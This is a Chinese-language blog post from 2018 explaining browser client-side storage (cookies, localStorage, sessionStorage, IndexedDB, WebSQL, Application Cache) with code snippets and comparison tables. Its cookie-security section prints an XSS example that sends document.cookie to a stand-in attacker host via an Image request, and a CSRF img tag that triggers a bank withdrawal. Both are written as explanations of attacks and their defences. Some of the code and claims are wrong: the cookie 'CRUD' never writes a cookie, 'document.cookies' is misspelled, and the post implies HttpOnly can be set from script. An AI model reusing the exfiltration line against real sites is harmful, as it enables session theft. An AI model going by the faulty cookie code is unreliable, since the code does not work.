---
layout:       post
title:        "客户端储存"
subtitle:     "cookies, local storage, session storage, indexed DB"
date:         2018-08-12 12:00:00
author:       "Lorry"
header-mask:  0.3
header-img:   '/img/back/localstorage-feature.png'
catalog:      true
multilingual: false
tags:
    - web
---
# 概述
## 客户端储存数据只有四种:

- Cookies
- Local Storage
- Session Storage
- Indexed DB

### 曾经还有一个WebSQL, 已经被废弃.详情请参见 [W3C](https://dev.w3.org/html5/webdatabase/), 简单的原因就是已经有了Indexed Database 可以更好的实现了.

## 好处
- 确保可靠的方式保存信息(数据的持久化)
- 减少带宽
- 提升响应能力
- 实现离线移动网页体验

# 存储分类

## 数据模型
- 结构化: 在预定义字段的表格中储存数据,IndexedDB.
- 键值: 键值储存区和NoSQL数据库 --> 唯一键值索引的非结构化数据, Cache API
- 字节流 长度可变, 不透明字节型字符串储存, --> file systems / blobs data

## 持久化
- Session 持久化: only single web session 或 浏览器标签页保持活跃时 --> Session Storage API 
- Device 持久化: 在同一设备内跨session 和browser标签/窗口 --> Cache API
- Global 持久化: 跨session和设备, 这是最强壮的数据持久化形式 --> Google Cloud Storage

## 对比
API|数据模型|持久化|浏览器支持|数据处理|Sync/Async
:---:|:---:|:---:|:---:|:---:|:---:|
File|system|Byte stream|device|52%|No|Async
Local Storage |	key/value|device|93%|No|Sync
Session Storage |key/value|session|93%|No|Sync
Cookies |structured|device|100%|No|Sync
WebSQL|structured|device|77%|Yes|Async
Cache|key/value|device|	60%|No|Async
IndexedDB|hybrid|device|83%	|Yes|Async
cloud storage|byte stream|global|100%|No|Both

## 由此可以看出有三种选择

- 离线储存: 使用Cache API, 只要是支持 [Service Worker technology](https://jakearchibald.github.io/isserviceworkerready/)就可以创建离线应用, 最适用于储存一直URL的资源.
- 储存应用状态和用户产生内容, 使用IndexedDB, 比第一种有更广泛的支持,
- 全局字节流的储存只有使用云储存服务(Cloud Storage service)

### Local Storage
CRUD
```js
// create && update
localStorage.setItem('myCat', 'Tom');
// read
localStorage.getItem('myCat');
// delete
localStorage.removeItem('myCat')
// delete all
localStorage.clear();
```
注意, setItem的value只能是string形式, 可以使用JSON.stringify.

### Session Storage
该属性可以获取当前origin的Session Storage, 使用方式跟Local Storage差不多. 唯一的区别是数据存在localStorage中没有过期设置(expiration set), 儿存在sessionStorage中的数据会在page session结束后被清除. 

只要浏览器打开,或者在页面刷新或重置时都会持续存在page session.

在新标签页或窗口中打开将创建一个新的session

**该session将会集成顶级(top-level)浏览器上下文的值, 这也是和session cookies的区别**

CRUD
```js
// create && update
sessionStorage.setItem('key', 'value')
// read
sessionStorage.getItem('key')
// delete
sessionStorage.removeItem('key')
// delete all
sessionStorage.clear();
```

### indexedDB

每个indexedDB下面的第一级都是database, 比如'staticDB', 包含三个属性:

- Security origin: 表示安全的域
- Name: database的名称
- Version: 版本

再下一级是具体的KVPs, 与session和local Storage不同的是:
- 包含一个多余的属性 **#** 表示序列
- value不是必须为string, 任意对象均可

### Web SQL
就是一个简单的sqllite, 可以自定义表结构,而不是遵循KVPs.

### Application Cache
只在支持HTTPS可用, 并且已经从web标准中移除了. 更倾向于使用Service Worker, 该功能是用于H5的离线, 可以通过该属性对需要cache且离线化的资源进行配置, 已经cache的应用可以在用户离线情况下刷新并正常工作.

有三大好处:
- 离线化浏览
- 提升浏览速度
- 降低服务器负载: 仅仅从服务器下载改变的资源.

#### 如何使用:

在`<html>`标签中添加manifest属性, 对应**cache manifest** 文件, 该text文件包含了浏览器应该cache的资源列表

需要在所有想要cache的页面中引入 `manifest` 属性. 

```html
<html manifest="example.appcache">
</html>
```

#### 配置manifest文件

第一行必须由`CACHE MANIFEST`组成, 在第一行的其他文本将会被忽略

其余行必须由一下组成:

- blank line: 空白行,包括0个或多个空格, tab
- Comment: 注释, #开头, 后续跟着0个或多个tabs或空格, 然后接注释文本. 只能在自有行中使用, 不能在其他行中添加.
- Section header: 部分头, 配置具体要操作cache manifest的那个section, 又有三种可能
    - CACHE:改变cache manifest的显式部分
    - NETWORK: 改变cache manifest在线白名单部分
    - FALLBACK: 改变cache manifest的回退部分

下面是www.example.com的例子:
```
CACHE MANIFEST
# v1 2011-08-14
# This is another comment
index.html
cache.html
style.css
image1.png

# Use from network if available
NETWORK:
network.html

# Fallback content
FALLBACK:
. fallback.html
```
由于已经废弃, 暂时讨论到这里, 如果有兴趣可参考 [MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Using_the_application_cache)

### Cookies

由服务器端发送到客户端并存储下来的字符串储存数据. 用于管理会话, 追踪用户信息. 自从有了localStorage和sessionStorage之后, cookies不被推荐用于储存数据了.

#### 基本CRUD操作

```js
// create
let cookie = document.cookie;
cookie = 'user_name=Lorry';
// read
console.log(cookie);
// update
cookie = 'user_age=25;max-age=31536000;secure';
//delete
cookie = 'user_name=Lorry;expires=Thu, 01 Jan 1970 00:00:01 GMT';
```

#### Cookies的优点:
- 与服务器端通信
- 当快要过期时可以重新设置而不是删除

#### 缺点
- 增加document的负载(我认为不是很大)
- 只能存储少量的数据
- 只能存储字符串(这是`localStorage`和`sessionStorage`的共缺, 但他们至少还支持JSON话的`string`, `cookies`不支持)
- 潜在的安全问题
#### 对这个安全问题简单展开一下:

因为cookie经常用于鉴权, 如果在网页中内嵌一个ifram, 然后携带cookies访问, 就会造成危险. 唯一能保护这类cookie的方式是使用不同的域或子域.
`document.cookies='name=lorry;password=123;domain=example.com'`

可是使用Img可以绕开跨域访问限制, 实施`XSS(cross site script)`攻击, 例如
```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
我们就可以设置HTTP-only cookies, 一旦cookies的属性被设置为HTTP-only, 那么就不能通过`document.cookies`获取了

`document.cookies='name=lorry;password=123;secure'`

设置了secure后, 在chrome52以前是只能通过http协议进行访问, 而之后则只能通过https进行访问.

那么CSRF问题又来了, 比如:
```js
<img src="http://bank.example/withdraw?account=bob&amount=1000000&for=mallory">
```
如果用户已经登录了网站,并且有了cookies, 在里面有一个恶意代码, 会发送一个请求, 用户的`cookies`也同时会发出, 那么银行就会认为验证有效, 所以便会成功把钱给转到骗子的账户.

##### 如何避免呢?
- 敏感信息需要再次确认, 且不能直接访问, 比如转账,取钱, 应有一个中间页, 需要再次输入密码鉴权.
- 尽可能设置短的`cookies`过期时间, 比如几分钟
- 验证时不仅仅依赖于`cookies`, 同时需要验证请求的方式, 比如使用 `POST`
而不是`GET`

## 横向对比

储存模式|大小|描述|读权限|老式浏览器兼容性|
--|--|--|--|--
LocalStorage| 5Mb/10Mb储存大小| 不基于会话, 需要通过js或手动在devtool中清楚 | 客户端 | 欠佳
SessionStorage| 5Mb 储存大小|基于每个窗口或tab的会话|客户端|欠佳
Cookie| 4Kb|过期时间需要设置并且在每个窗口或tab上工作|服务端和客户端|好

